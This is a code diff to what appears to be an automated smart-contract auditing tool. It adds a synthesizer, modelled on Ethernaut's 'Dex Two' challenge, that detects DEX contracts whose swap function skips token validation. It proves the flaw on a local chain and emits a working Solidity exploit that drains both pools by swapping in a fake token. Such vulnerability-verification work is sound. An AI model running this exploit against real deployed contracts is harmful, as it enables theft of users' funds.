@@ -2944,6 +2944,116 @@ def _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0):
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_dex_two_drain(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Dex Two 류: swap 이 from/to 가 token1/token2 인지 확인하지 않아, 공격자가
+    가짜 토큰을 dex 에 넣고 swap(fake, real) 로 진짜 토큰을 전량 인출한다. 두 진짜 풀을
+    모두 0 으로 만드는지로 증명한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    swapfn = None
+    for fn in _functions(tb):
+        if fn["name"] == "swap" and fn["external"]:
+            swapfn = fn
+    if not swapfn:
+        return None
+    # 구분: Dex(토큰 강제 require 있음)는 제외 — DexTwo 는 그 require 가 없음
+    if re.search(r"==\s*token1\b", swapfn["body"]) or re.search(r"Invalid tokens", swapfn["body"]):
+        return None
+    if not (re.search(r"\btoken1\b", tb) and re.search(r"\btoken2\b", tb) and "balanceOf" in tb):
+        return None
+    setup = None
+    for fn in _functions(tb):
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
+                and "transfer" in fn["body"] and fn["name"] != "swap":
+            setup = fn["name"]; break
+    _solcv, _evm = _solc_for(target_src)
+    fake_src = (HEADER + "contract Fake {\n"
+        "    mapping(address=>uint256) public bal; mapping(address=>mapping(address=>uint256)) public allow;\n"
+        "    constructor(uint256 s){ bal[msg.sender]=s; }\n"
+        "    function transfer(address to,uint256 a) external returns(bool){ bal[msg.sender]-=a; bal[to]+=a; return true; }\n"
+        "    function transferFrom(address f,address to,uint256 a) external returns(bool){ if(allow[f][msg.sender]!=type(uint256).max) allow[f][msg.sender]-=a; bal[f]-=a; bal[to]+=a; return true; }\n"
+        "    function approve(address s,uint256 a) external returns(bool){ allow[msg.sender][s]=a; return true; }\n"
+        "    function balanceOf(address w) external view returns(uint256){ return bal[w]; }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Fake.sol":{"content":fake_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Fake" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    if not (_has_getter(abi, "token1") and _has_getter(abi, "token2")):
+        return None
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":8_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    if setup:
+        try: getattr(tc.functions, setup)(Web3.to_checksum_address(acct)).transact({"from":acct,"gas":2_000_000})
+        except Exception: return None
+    t1 = tc.functions.token1().call(); t2 = tc.functions.token2().call()
+    erc = arts["Fake"]["abi"]
+    def bal(addr, who): return int(w3.eth.contract(address=addr, abi=erc).functions.balanceOf(who).call())
+    d1 = bal(t1, taddr); d2 = bal(t2, taddr)
+    if d1 == 0 or d2 == 0:
+        return None
+    try:
+        faddr = deploy("Fake", [d1 + d2 + 10])   # 넉넉히 민팅
+        fake = w3.eth.contract(address=faddr, abi=erc)
+        fake.functions.transfer(taddr, d1).transact({"from":acct,"gas":200000})     # dex 에 fake d1 주입
+        fake.functions.approve(taddr, (1<<256)-1).transact({"from":acct,"gas":200000})
+        # swap1: fake→token1, amount = d1 (dexFake=d1) → out = d1*d1/d1 = d1  (token1 소진)
+        getattr(tc.functions, "swap")(Web3.to_checksum_address(faddr), Web3.to_checksum_address(t1), d1).transact({"from":acct,"gas":1_000_000})
+        df = bal(faddr, taddr)   # 이제 dex fake 잔액
+        # swap2: fake→token2, amount = df → out = df*d2/df = d2 (token2 소진)
+        getattr(tc.functions, "swap")(Web3.to_checksum_address(faddr), Web3.to_checksum_address(t2), df).transact({"from":acct,"gas":1_000_000})
+    except Exception:
+        return None
+    if not (bal(t1, taddr) == 0 and bal(t2, taddr) == 0):
+        return None
+    poc = (HEADER +
+        "// Strategy: Dex Two. swap() never checks the tokens are token1/token2, so seed the\n"
+        "// dex with a worthless token and swap it for the real ones to drain both pools.\n"
+        "interface IDex { function token1() external view returns(address); function token2() external view returns(address);\n"
+        "    function swap(address,address,uint256) external; }\n"
+        "interface IERC20 { function transfer(address,uint256) external returns(bool);\n"
+        "    function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }\n"
+        "contract Fake { mapping(address=>uint256) public b; mapping(address=>mapping(address=>uint256)) public al;\n"
+        "    constructor(uint256 s){ b[msg.sender]=s; }\n"
+        "    function transfer(address to,uint256 a) external returns(bool){ b[msg.sender]-=a; b[to]+=a; return true; }\n"
+        "    function transferFrom(address f,address to,uint256 a) external returns(bool){ if(al[f][msg.sender]!=type(uint256).max) al[f][msg.sender]-=a; b[f]-=a; b[to]+=a; return true; }\n"
+        "    function approve(address s,uint256 a) external returns(bool){ al[msg.sender][s]=a; return true; }\n"
+        "    function balanceOf(address w) external view returns(uint256){ return b[w]; } }\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        "        address a = IDex(t).token1(); address c = IDex(t).token2();\n"
+        "        uint256 d1 = IERC20(a).balanceOf(t); uint256 d2 = IERC20(c).balanceOf(t);\n"
+        "        Fake f = new Fake(d1 + d2 + 10);\n"
+        "        f.transfer(t, d1); f.approve(t, type(uint256).max);\n"
+        "        IDex(t).swap(address(f), a, d1);\n"
+        "        IDex(t).swap(address(f), c, IERC20(address(f)).balanceOf(t));\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (dex2-drain)","strategy":"dex2-drain","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"both dex pools drained via fake token",
+            "strategy":"dex2-drain:swap","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"swap 이 토큰을 검증하지 않아 가짜 토큰으로 두 진짜 풀을 모두 소진했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_array_underflow(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Alien Codex 류: 동적 배열 length 를 언더플로(length-- / length -=1)시켜
     전체 스토리지를 배열 범위로 만든 뒤, 인덱스 계산으로 slot0(owner)을 임의 기록해 탈취.
@@ -3782,7 +3892,14 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
-    # 0s) Dex (스팟가격 반올림 반복 스왑 드레인)
+    # 0s) Dex Two (토큰 미검증 → 가짜 토큰 드레인) — Dex 보다 먼저(require 없는 변종)
+    try:
+        r = _synth_dex_two_drain(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0t) Dex (스팟가격 반올림 반복 스왑 드레인)
     try:
         r = _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0)
         if r:
@@ -3855,7 +3972,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
                _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
                _synth_gatekeeper_two, _synth_gatekeeper_one, _synth_magicnumber,
-               _synth_higher_order, _synth_switch, _synth_array_underflow, _synth_dex_drain):
+               _synth_higher_order, _synth_switch, _synth_array_underflow,
+               _synth_dex_two_drain, _synth_dex_drain):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
